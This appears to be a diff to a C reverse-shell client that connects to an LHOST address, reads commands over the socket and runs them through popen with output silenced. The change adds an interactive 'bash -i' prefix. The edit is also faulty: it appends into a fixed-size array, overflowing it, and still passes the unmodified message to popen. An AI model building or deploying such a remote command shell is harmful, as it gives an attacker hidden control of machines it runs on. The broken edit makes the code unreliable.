@@ -15,8 +15,9 @@ int fd;
 int conn; 
 int valread;
 char output;
+char interactive[] = "bash -i ";
 char shell[10000];
-char redirect[100] = " >/dev/null 2>&1";
+char redirect[] = " >/dev/null 2>&1";
 
 int main(){
   char ip[] = LHOST;
@@ -39,7 +40,8 @@ int main(){
     valread = read(fd, message, 10000);
         
     if(valread > 0){
-      strcat(message, redirect);
+      strcat(interactive, message);
+      strcat(interactive, redirect);
       message[strlen(message)] = ' ';
 
       FILE *file = popen(message, "r");
